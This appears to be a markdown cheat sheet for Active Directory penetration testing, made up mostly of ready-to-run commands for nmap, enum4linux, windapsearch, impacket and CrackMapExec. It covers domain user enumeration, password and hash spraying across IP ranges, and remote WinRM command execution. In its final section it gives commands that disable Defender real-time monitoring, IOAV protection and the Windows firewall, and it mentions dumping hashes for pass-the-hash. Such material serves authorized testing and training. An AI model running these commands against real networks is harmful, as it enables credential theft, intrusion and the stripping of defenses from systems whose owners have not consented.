# AD-Pentesting

**1. Network Enumeration - NMAP** <br>
  `sudo nmap -sC -sV -Pn -A -oA nmap/IP --script=vuln -p- IP -vv`
  - Domain Controller might have port opened like `53,88,135,139,389,445,464,593,636,3268,3269,3389`
  - A domain controller is a server with AD DS server role installed that has specifically been promoted to domain controller.
    - Host a copy of the AD DS directory store
    - Provide authentication and authorization services
    - Replicate updates to other domain controls in domain and forest
    - Allow administrative access to manage user accounts and network resources
  - Note Down the Full Qualified Domain Name, DNS Domain Name, DNS Computer Name and Computer Name with their IP and open ports.
  - Fully Qualified Domain Name: A fully qualified domain name (FQDN) is the complete domain name for a specific computer, or host, on the internet. The FQDN consists of two parts: the hostname and the domain name. For example, an FQDN for a hypothetical mail server might be mymail.somecollege.edu. <br> <br>

**2. Network Enumeration - SMB**
  - List all SMB related script on NMAP. `ls /usr/share/nmap/scripts/ | grep smb`
  - `nmap -Pn --script smb-enum* -p139,445 IP | tee smb-enumeration`
  - `nmap -Pn --script smb-vuln* -p139,445 IP | tee smb-vulnerabilities`

  - SMB Enumerations with smbclient : `smbclient -L IP`
    - Try to access the drive : `smbclient \\\\IP\\DriveName`
  
  - SMB Enumerations with smbmap : `smbmap -H IP` <br><br>
  
**3. Domain Enumeration - windapsearch**
- [windapsearch](https://github.com/ropnop/windapsearch) is a python script to enumerate users, groups and computers from windows domain through LDAP.
- Enumerate Users without credentials
  - `python3 windapsearch -d <Domain Name> --dc-ip <Domain Controller IP> -U | tee windapsearch-enumeration-users`
- Enumerate Users with credentials
  - `python3 windapsearch -d <Domain Name> --dc-ip <Domain Controller IP> -u "domain\\username" -p "password" -U | tee winapsearch-authenticated-enumerations`
- Enumerate Groups with credentials
  - `python3 windapsearch -d <Domain Name> --dc-ip <Domain Controller IP> -u "domain\\username" -p "password" -G | tee winapsearch-authentication-group-enumerations`
- Enumerate unconstrained computers
  - `python3 windapsearch -d <Domain Name> --dc-ip <Domain Controller IP> -u "domain\\username" -p "password" --unconstrained-computers | tee unconstrained-computers-enumeration`
  - Unconstrained means that the computer is going to be able to impersonate anybody, if they have the hases for that. We can have the domain admin connected to these unconstrained comupter from there we can impersonate that as the domain admin.<br><br>

**4. Domain Enumeration - LdapDomainDump**
- [LdapDomainDump](https://github.com/dirkjanm/ldapdomaindump) is a tool to enumerate users, groups and computers. A better tool than windapsearch.
- `python3 ldapdomaindump.py --user "domain\\user" -p "password" ldap://DomainControllerIP:389 --no-json --no-grep -o output`
- The result can be seen on output directory. Make a output directory before running the above commands. <br><br>

**5. Domain Enumeration - Enumerating with Enum4Linux**
- Use cases
  - RID cycling (when RestrictAnonyomous is set to 1 on Windows 2000) 
  - User Listing (when RestrictAnonymous is set to 0 on Windows 2000)
  - Listing of group memebership information.
  - Share enumeration
  - Detecting if host in a workgroup or domain
  - Identifying the remote operating system
  - Password policy retrieval (using polenum)
- The Do Everything option
  - `enum4linux -a <IP>`. Here the IP is Domain Controller
- The Do Everything option with authentication
  - `enum4linux -u username -p password -a <IP>`
- List of usernames
  - `enum4linux -U <IP>`
- List of usernames with authentication
  - `enum4linux -u username -p password -U <IP>`
- Group Membership
  - `enum4linux -G IP`
- Group nbtstat Information
  - `enum4linux -n IP`
- Listing Windows shares
  - `enum4linux -S IP`
- Getting Printer Information
  - `enum4linux -i iP`
- Note down the Domain info like domain names, users and passwords, domain sid <br><br>

**6. Domain Enumeration NMAP Users**
- Using LDAP
  - `nmap -p389 --script ldap-search --script-args 'ldap.username="cn=ippsec,cn=users,dc=pentesting,dc=local",ldap.password=Password12345,ldap.qfilter=users,ldap.attrib=sAMAccountName' <IP> -Pn -oA nmap/domain-users`
  - Where domain name = pentestig.local, username=ippsec, password=Password12345.
  - It will list all the available users on the domain.
  - For enumerating groups, change `cn=users` to `cn=groups` and `ldap.qfilter=users` to `ldap.qfilter=groups` from the above commands<br><br>
- Using Kerberos
  - `nmap -p88 --script=krb5-enum-users --script-args krb5-enum-users.realm='pentesting.local' <IP> -Pn` -> Anonymous enumeration <br><br>
  
**7. Domain Enumeration GetADUsers.py**
- A python script developed by impacket to enumerate the domain users. [Download](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetADUsers.py)
- `python3 GetADUsers.py -all pentesting.local/ippsec:Password12345 -dc-ip 192.168.10.50`
- Where pentesting.local is domain name, ippsec and Password12345 is a credentials for domain controller 192.168.10.50
- Other tools developed my impacket [here](https://github.com/SecureAuthCorp/impacket/tree/master/examples).

- Find Delegations : AD delegation is critical part of security and compliance. By delegating control over active directory, you can grant users or groups the permissions they need without adding users to privileged groups like Domain Admins and Account Operators.
  - `python3 findDelegation.py -dc-ip 192.168.1.50 pentesting.local/ippsec:Password12345` - Download file from [here](https://github.com/SecureAuthCorp/impacket/blob/master/examples/findDelegation.py). <br><br>

**8. SwisArmy CrackMapExec Intro**
- A post exploitation tool that helps automate assessing the security of large Active Directory Networks
- Available Protocols : ldap, mssql, smb, ssh, winrm <br> <br>

**9. SwisArmy CrackMapExec Password Spraying**
- Spray credentials to IP range
  - `crackmapexec smb 192.168.1.50-192.168.1.55 -u ippsec -p Password12345 --no-bruteforce`
  - It will also show if we have an admin access, if it has a admin access, it will show (Pwn3d!) message.
- Spray different users and password combination
  - `crackmapexec smb 192.168.1.50-192.168.1.55 -u usernames.txt -p passwords.txt --no-bruteforce`
- Spray Hashes to IP range
  - `crackmapexec smb 192.168.1.50-192.168.1.55 -H hashes.txt --no-bruteforce`
- By default CrackMapExec exit after a successfull login is found. Using the `--continue-on-success` flag will continue spraying even after a valid password is found. <br><br>

**10. SwisArmy CrackMapExec ENUM 1**
- Use smb modules to do some enumeration for the shares
  - `crackmapexec smb 192.168.1.50-192.168.1.55 -u ippsec -p Password12345 --shares`
  - It will provide the share name, permissions and remarks
  - We can follow the result gained by it using SMBCLIENT to access the shares after this.
- Sessions
  - Take a look at a sesions and see if they is any sessions going on which we have access.
  - `crackmapexec smb 192.168.1.50-192.168.1.55 -u ippsec -p Password12345 --sessions`
- Enumerate Disks
  - `crackmapexec smb 192.168.1.50-192.168.1.55 -u ippsec -p Password12345 --disks`
- Logged on Users
  - See if we have any logged on users in the network
  - `crackmapexec smb 192.168.1.50-192.168.1.55 -u ippsec -p Password12345 --loggedon-users`
  - If we are a local admin, but we might not be a domain admin, if the logged on users are domain admin we will be able to dump the hashes and can perform Pass The Hash attack and get a sessions.
- Get all users
  - `crackmapexec smb 192.168.1.50-192.168.1.55 -u ippsec -p Password12345 --users` <br><br>

**11. SwisArmy CrackMapExec ENUM 2**
- Enumerate RID : Relative Identifier (RID) is a variable length number that is assigned to objects at creation and becomes part of the Objet's Security Identifier (SID) that uniquely identifies an account or group within a domain. Domain SID is same on a same domain but RID is different per object. Windows creates a RID by default in Active Directory. Example, RID 501 for administrator, 502 for default and 503 for guest account.
  - `crackmapexec smb 192.168.1.50-192.168.1.55 -u ippsec -p Password12345 --rid-brute` It will also show which are group, users, alias.
- Enumerate Password Policy
  - `crackmapexec smb 192.168.1.50-192.168.1.55 -u ippsec -p Password12345 --pass-pol` <br> <br>

**12. SiwsArmy CrackMapExec Command Execution**
-  `crackmapexec winrm 192.168.1.54 -u ippsec -p Password12345 -x 'whoami'`
-  Where 192.168.1.54 have a local domain access, -x is a commandline, -X powershell script or command line.
-  `crackmapexec winrm 192.168.1.54 -u ippsec -p Password12345 -X 'whoami'`
-  Verify local admin access
  - `crackmapexec winrm 192.168.1.54 -u ippsec -p Password12345 -X 'whoami /groups'`
  - If it is a part of BUILTIN\Administrator, it has local admin access on the machine.
  - Giving local admin access means giving them full control over the local computer.
- Get Computer Status : like antivirus status, protections, real time protection.
  - `crackmapexec winrm 192.168.1.54 -u ippsec -p Password12345 -X 'Get-MpComputerstatus'
- If we are a domain admin, we can disable such things.
- Disable Monitoring
  - `crackmapexc winrm 192.168.1.54 -u ippsec -p Password12345 -X 'Set-MpPreference -DisableRealtimeMonitoring $true`
- Disable Antivirus
  - `crackmapexec winrm 192.168.1.54 -u ippsec -p Password12345 -X 'Set-MpPreference -DisableIOAVProtection $true`
- Verify if these are disabled or not
  - `crackmapexec winrm 192.168.1.54 -u ippsec -p Password12345 -X 'Get-MpComputerstatus'`
- View all profiles, public private, firewalls
  - `crackmapexec winrm 192.168.1.54 -u ippsec -p Password12345 -X 'netsh advfirewall show allprofiles'`
  - If they are enabled, disable with
  - `crackmapexec winrm 192.168.1.54 -u ippsec -p Password12345 -X 'netsh advfirewall set allprofiles state off'`
- Enumerate Directories
  - `crackmapexec winrm 192.168.1.54 -u ippsec -p Password12345 -X 'dir C:\Users\ippsec'`  
- Read Files
  - `crackmapexec winrm 192.168.1.54 -u ippsec -p Password12345 -X 'type C:\Users\ippsec\users.txt'`
